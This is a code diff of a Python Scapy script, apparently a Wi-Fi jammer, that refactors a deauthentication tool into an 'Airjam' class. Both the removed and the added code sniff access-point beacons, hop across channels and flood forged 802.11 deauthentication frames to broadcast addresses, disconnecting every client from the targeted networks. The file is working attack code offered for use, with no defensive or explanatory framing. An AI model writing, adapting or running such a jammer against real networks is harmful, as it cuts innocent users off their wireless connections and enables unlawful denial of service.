@@ -1,69 +1,50 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import argparse, random, time, os, sys, signal
+import argparse, time, os, sys, signal, re
 from scapy.all import *
-from multiprocessing import Process
+from multiprocessing import Process, Manager
 
-inteface   = ''
-count      = 6
-white_list = ['48:5b:39:85:ae:52'] 
+class Airjam():
 
-def packet_sniffer():
-    pkt     = sniff(iface=interface, timeout=1, lfilter= lambda x: x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp))
-    u_pkt   = []
-    u_addr2 = []
+    def __init__(self, interface, target):
+        self.interface = interface
+        self.target    = target
 
-    for p in pkt:
-        if p.addr2 not in u_addr2:
-            u_pkt.append(p)
-            u_addr2.append(p.addr2)
+        self.manager = Manager()
 
-    return u_pkt
+        self.flags = self.manager.dict()
 
-def deauth(pkt):
-    bssid   = pkt.addr2
-    essid   = pkt[Dot11Elt].info
-    channel = ord(pkt[Dot11Elt:3].info)
-    client  = 'ff:ff:ff:ff:ff:ff'
+    def deauth(self, pkt):
+        if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
+            if bool(re.search(self.target, pkt[Dot11].addr3)):
+                essid = pkt[Dot11Elt].info
+                bssid = pkt[Dot11].addr3 
+                channel = int(ord(pkt[Dot11Elt:3].info))
+                client  = 'ff:ff:ff:ff:ff:ff'
 
-    if pkt.addr2 not in white_list:
-        os.system("iw dev %s set channel %d" % (interface, channel))
-        print "sending deauth packets for %s, channel %d..." % (essid, channel)
-        sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=pkt.addr3)/Dot11Deauth(), count=count, iface=interface, verbose=0)
-    else:
-        print "%s in white list... ignoring" % (essid)
+                print "%s ( %s ) on channel %d" % (essid, bssid, channel)
 
-def channel_hopper():
-    while True:
-        for channel in range(10,13):
-            os.system("iw dev %s set channel %d" % (interface, channel))
-            time.sleep(0.5)
+                os.system("iw dev %s set channel %d" % (self.interface, channel))
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='deauth scapy')
-    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='interface to use')
-    parser.add_argument('-c', '--count', dest='count', type=int, required=False, help='count packets')
+                sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=pkt.addr3)/Dot11Deauth(), count=6, iface=self.interface, verbose=0)
 
-    args = parser.parse_args()
+    def keep(self, pkt):
+        return self.flags['stop_sniff']
 
-    interface = args.interface
-    count     = args.count
+    def hopper(self):
+        for channel in range(1,14):
+            print "set up channel: %d" % channel
+            os.system("iw dev %s set channel %d" % (self.interface, channel))
+            time.sleep(0.7)
+        self.flags['stop_sniff'] = True
 
-    #os.system("ifconfig %s down" % interface)
-    #os.system("iwconfig %s mode monitor" % interface)
-    #os.system("ifconfig %s up" % interface)
+    def run(self):
+        while True:
+            self.flags['stop_sniff'] = False
+            p = Process(target = self.hopper)
+            p.start()
+            sniff(iface=self.interface, prn=self.deauth, stop_filter=self.keep)
+            p.terminate()
+            p.join()
 
-    while True:
-        try:
-            hop = Process(target=channel_hopper)
-            hop.start()
-
-            pkt_ssid = packet_sniffer()
-
-            hop.terminate()
-
-            for pkt in pkt_ssid:
-                deauth(pkt)
-        except KeyboardInterrupt:
-            sys.exit(0)
